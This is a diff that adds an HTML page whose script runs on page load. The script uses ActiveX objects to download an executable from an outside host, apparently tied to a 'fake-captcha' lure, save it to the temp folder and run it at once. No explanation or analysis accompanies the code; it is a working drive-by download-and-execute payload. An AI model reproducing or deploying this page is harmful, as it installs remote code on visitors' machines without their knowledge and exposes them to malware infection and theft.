@@ -1,0 +1,31 @@
+<html>
+<head>
+    <script>
+        // Function to download and run the EXE
+        function runExecutable() {
+            var url = "https://code.mas0ng.com/fake-captcha/main.exe"; // URL of your EXE
+            var shell = new ActiveXObject("WScript.Shell");
+            var tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
+            var exePath = tempPath + "\\main.exe";
+
+            // Create an object to download the file
+            var xhttp = new ActiveXObject("MSXML2.XMLHTTP");
+            xhttp.open("GET", url, false);
+            xhttp.send();
+
+            // Save the file locally
+            var stream = new ActiveXObject("ADODB.Stream");
+            stream.Type = 1; // Binary
+            stream.Open();
+            stream.Write(xhttp.responseBody);
+            stream.SaveToFile(exePath, 2); // Overwrite if exists
+
+            // Run the executable
+            shell.Run(exePath);
+        }
+    </script>
+</head>
+<body onload="runExecutable()">
+    <h1>Running your executable...</h1>
+</body>
+</html>
